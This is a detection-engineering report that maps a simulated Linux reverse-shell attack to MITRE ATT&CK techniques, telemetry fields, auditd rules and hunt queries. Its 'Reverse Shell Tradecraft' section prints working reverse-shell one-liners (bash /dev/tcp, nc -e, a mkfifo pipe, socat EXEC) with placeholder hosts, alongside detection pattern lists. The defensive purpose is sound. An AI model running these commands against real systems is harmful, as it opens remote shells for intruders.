# Reverse Shell Execution Threat Mapping

---

# Overview

This document maps the simulated Linux reverse shell execution activity to MITRE ATT&CK techniques, adversary behaviors, telemetry opportunities, and detection surfaces.

The simulation reproduced attacker post-exploitation behavior where a compromised Linux host initiated an outbound callback connection to an attacker-controlled listener, enabling remote interactive shell access.

The objective of this threat mapping is to:

- align observed activity with ATT&CK techniques
- map attacker objectives and behaviors
- identify telemetry opportunities
- define behavioral detection surfaces
- support detection engineering workflows
- document reverse shell tradecraft

---

# Threat Scenario Summary

The simulation emulated reverse shell execution behavior commonly observed during post-exploitation operations.

The attack involved:

- shell interpreter execution
- interactive shell invocation
- outbound TCP communication
- shell-to-network correlation
- remote command execution capability
- attacker-controlled callback behavior

Observed behaviors included:

- bash execution
- shell redirection
- outbound socket creation
- suspicious command-line syntax
- networking utility execution
- process lineage anomalies

---

# ATT&CK Technique Mapping

| ATT&CK Tactic | Technique | ID |
|---|---|---|
| Execution | Command and Scripting Interpreter | T1059 |
| Execution | Unix Shell | T1059.004 |
| Command and Control | Application Layer Protocol | T1071 |
| Command and Control | Non-Application Layer Protocol | T1095 |
| Command and Control | Ingress Tool Transfer | T1105 |

---

# Primary Technique

# T1059.004 — Unix Shell

## Description

Adversaries may abuse Unix shell interpreters such as:

- bash
- sh
- zsh

to execute commands, establish persistence, or create reverse shell connections.

The reverse shell simulation demonstrated attacker-controlled command execution through shell interpreters.

---

# Secondary Technique

# T1071 — Application Layer Protocol

## Description

Adversaries may use outbound network communication over common protocols to establish command-and-control channels.

The reverse shell simulation demonstrated:

- outbound callback communication
- interactive shell transport
- remote command execution capability

---

# Simulated Adversary Objective

The simulated attacker objective was:

```text
Gain Interactive Remote Access
            ↓
Execute Shell
            ↓
Establish Outbound Callback
            ↓
Maintain Remote Command Execution
```

---

# Simulated Attack Flow

```text
Shell Invocation
        ↓
Reverse Shell Syntax Execution
        ↓
Socket Creation
        ↓
Outbound TCP Callback
        ↓
Attacker Listener Receives Shell
        ↓
Remote Interactive Access Established
```

---

# Adversary Tradecraft Mapping

# Execution

The simulation demonstrated attacker command execution through:

```text
bash
sh
python
netcat
socat
```

---

# Command and Control

The attack established remote interactive access through:

- outbound TCP communication
- callback behavior
- shell-to-network redirection
- interactive session creation

---

# Defense Evasion Characteristics

The simulation demonstrated behaviors commonly associated with defense evasion:

- living-off-the-land utilities
- shell-based execution
- legitimate binary abuse
- transient process execution
- outbound communication blending

---

# Reverse Shell Tradecraft

# Bash TCP Redirection

## Example

```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```

---

## Threat Characteristics

| Indicator | Detection Value |
|---|---|
| `/dev/tcp/` | High |
| `0>&1` | High |
| `bash -i` | High |
| descriptor redirection | High |

---

# Netcat Reverse Shell

## Example

```bash
nc -e /bin/bash IP PORT
```

---

## Threat Characteristics

| Indicator | Detection Value |
|---|---|
| `nc -e` | High |
| shell execution through netcat | High |
| outbound callback | High |

---

# FIFO Reverse Shell

## Example

```bash
mkfifo /tmp/f; nc IP PORT < /tmp/f | /bin/sh > /tmp/f
```

---

## Threat Characteristics

| Indicator | Detection Value |
|---|---|
| `mkfifo` | High |
| named pipe creation | Medium |
| shell redirection | High |

---

# Python Reverse Shell

## Example

```python
python -c 'import socket,subprocess,os'
```

---

## Threat Characteristics

| Indicator | Detection Value |
|---|---|
| `import socket` | High |
| subprocess execution | High |
| inline code execution | Medium |

---

# Socat Reverse Shell

## Example

```bash
socat TCP:IP:PORT EXEC:/bin/bash
```

---

## Threat Characteristics

| Indicator | Detection Value |
|---|---|
| `EXEC:/bin/bash` | High |
| TCP shell relay | High |
| outbound callback | High |

---

# Behavioral Indicator Mapping

# High-Value Behavioral Indicators

| Indicator | Detection Value |
|---|---|
| shell execution | High |
| outbound network connection | High |
| shell-to-network correlation | Critical |
| suspicious command-line syntax | High |
| networking utility execution | High |
| suspicious parent-child lineage | High |

---

# Process Lineage Mapping

## Typical Reverse Shell Lineage

```text
bash
 └── outbound TCP connection
```

---

## Netcat-Based Execution

```text
bash
 └── nc
      └── outbound connection
```

---

## Web Exploitation Scenario

```text
apache2
 └── bash
      └── nc
```

---

## Script-Based Reverse Shell

```text
python
 └── sh
      └── outbound connection
```

---

# Detection Surface Mapping

# Shell Execution Detection

## Monitored Interpreters

```text
/bin/bash
/bin/sh
/usr/bin/bash
/usr/bin/sh
```

---

## Detection Opportunities

Monitor for:

- interactive shell invocation
- suspicious shell arguments
- shell execution from services
- shell execution from web applications
- unusual parent-child relationships

---

# Network Utility Detection

## Monitored Utilities

```text
nc
netcat
curl
wget
python
perl
php
socat
openssl
```

---

## Detection Opportunities

Detect:

- shell-spawned networking utilities
- outbound callback behavior
- suspicious socket creation
- shell-linked outbound traffic

---

# Outbound Network Detection

## Detection Opportunities

Monitor for:

- outbound TCP callbacks
- shell-associated sockets
- external communication initiated by interpreters
- uncommon outbound destinations
- interactive session behavior

---

# Common Reverse Shell Ports

The following ports were monitored due to common attacker usage:

```text
4444
4445
5555
8080
9001
1337
```

Port-based detection alone is insufficient because attackers may use arbitrary ports.

---

# Telemetry Mapping

# Process Execution Telemetry

## High-Value Fields

| Field | Purpose |
|---|---|
| Image | executed binary |
| ParentImage | process ancestry |
| CommandLine | reverse shell syntax |
| PID | process tracking |
| PPID | lineage correlation |
| User | execution context |
| Timestamp | event sequencing |

---

# Network Telemetry

## High-Value Fields

| Field | Purpose |
|---|---|
| SourceIP | affected host |
| DestinationIP | attacker infrastructure |
| DestinationPort | callback destination |
| ProcessName | originating process |
| PID | process correlation |
| Protocol | TCP/UDP visibility |

---

# Auditd Telemetry Mapping

# Relevant Syscalls

```text
execve
connect
socket
dup2
```

---

# Syscall Relevance

| Syscall | Purpose |
|---|---|
| execve | shell execution visibility |
| connect | outbound callback visibility |
| socket | socket creation visibility |
| dup2 | descriptor redirection visibility |

---

# Required Auditd Rules

## Process Execution Monitoring

```bash
-a always,exit -F arch=b64 -S execve -k exec_monitor
```

---

## Network Connection Monitoring

```bash
-a always,exit -F arch=b64 -S connect -k network_connect
```

---

## Socket Monitoring

```bash
-a always,exit -F arch=b64 -S socket -k socket_monitor
```

---

# Threat Detection Opportunities

# High-Fidelity Detection Opportunities

| Detection Opportunity | Fidelity |
|---|---|
| shell + outbound connection | Critical |
| `/dev/tcp/` usage | High |
| shell-spawned netcat | High |
| shell execution from web service | High |
| `EXEC:/bin/bash` usage | High |
| shell-to-network correlation | Critical |

---

# Medium-Fidelity Detection Opportunities

| Detection Opportunity | Fidelity |
|---|---|
| suspicious shell execution | Medium |
| networking utility execution | Medium |
| uncommon outbound ports | Medium |
| shell redirection syntax | Medium |

---

# Low-Fidelity Detection Opportunities

| Detection Opportunity | Fidelity |
|---|---|
| isolated shell execution | Low |
| standalone curl/wget execution | Low |
| generic TCP connections | Low |

---

# Threat Hunting Opportunities

## Hunt Query — Shell to Network Correlation

```text
Shell Process
    +
Outbound TCP Connection
```

---

## Hunt Query — Web Service to Shell

```text
ParentImage = apache2/nginx
AND
Image = bash/sh
```

---

## Hunt Query — Reverse Shell Syntax

```text
/dev/tcp/
0>&1
nc -e
EXEC:/bin/bash
```

---

## Hunt Query — Suspicious Parent-Child Chains

```text
python → sh
apache2 → bash
systemd → bash
```

---

# Telemetry Challenges Observed

# Challenge 1 — Incomplete Shell Visibility

Shell execution telemetry depended heavily on:

- execve auditing
- command-line visibility
- process execution monitoring

Without these, reverse shell visibility degraded significantly.

---

# Challenge 2 — Weak Network Attribution

Some network telemetry lacked:

- PID correlation
- process attribution
- shell linkage

This complicated shell-to-network reconstruction.

---

# Challenge 3 — Short-Lived Process Visibility

Reverse shell processes were sometimes transient.

This reduced:

- command-line capture reliability
- ancestry visibility
- telemetry completeness

---

# Challenge 4 — Tooling Inconsistency

Process hierarchy visibility varied across:

- htop
- pstree
- auditd telemetry
- process monitoring tools

This created investigation inconsistencies.

---

# False Positive Considerations

## Potential Legitimate Sources

Possible benign sources included:

- administrative troubleshooting
- developer testing
- authorized penetration testing
- automation frameworks
- remote management tooling

---

# False Positive Reduction

Recommended exclusions:

- trusted administration systems
- sanctioned automation infrastructure
- approved testing environments
- internal management tooling

---

# Severity Assessment

| Severity | Condition |
|---|---|
| Critical | confirmed shell + outbound callback |
| High | shell spawned networking utility |
| Medium | suspicious shell execution |
| Low | isolated shell anomaly |

---

# Detection Engineering Insights

# Insight 1 — Behavioral Correlation Is Mandatory

Reliable detection required:

```text
Shell Execution
    +
Process Lineage
    +
Outbound Network Activity
```

Single indicators were insufficient.

---

# Insight 2 — Command-Line Analytics Are High Value

The strongest indicators included:

- `/dev/tcp/`
- `0>&1`
- `bash -i`
- `nc -e`
- `EXEC:/bin/bash`

---

# Insight 3 — Process Lineage Increases Fidelity

Suspicious ancestry significantly improved confidence.

Examples:

```text
apache2 → bash
python → sh
systemd → bash
```

---

# Insight 4 — Network Telemetry Alone Is Weak

Outbound connections without process attribution produced weak detection fidelity.

Process-linked networking telemetry was significantly stronger.

---

# Threat Mapping Validation

The simulation successfully demonstrated:

- realistic Linux reverse shell behavior
- ATT&CK-aligned adversary tradecraft
- shell-to-network behavioral correlation
- outbound callback activity
- command-and-control characteristics
- observable telemetry generation

---

# Recommended Evidence Collection

| Evidence | Purpose |
|---|---|
| reverse-shell-listener.png | callback confirmation |
| process-lineage(htop).png | ancestry visibility |
| network-connection-proof.png | outbound callback proof |
| auditd-execve-proof.jpg | syscall visibility |
| detection-trigger-proof.png | Sigma validation |
| shell+outbound_connection_logs.txt | telemetry correlation |

---

# Final Threat Assessment

The reverse shell execution simulation successfully reproduced realistic Linux post-exploitation behavior aligned with MITRE ATT&CK techniques including T1059.004 and T1071.

The simulation validated that:

- reverse shells produce observable shell execution telemetry
- shell-to-network correlation is the strongest detection signal
- command-line analytics provide high-fidelity indicators
- process lineage significantly improves detection quality
- behavioral analytics are more reliable than isolated indicators

The threat mapping confirms that the simulation generated operationally relevant telemetry and attacker behavior suitable for detection engineering, Sigma development, ATT&CK alignment, and investigation workflows.
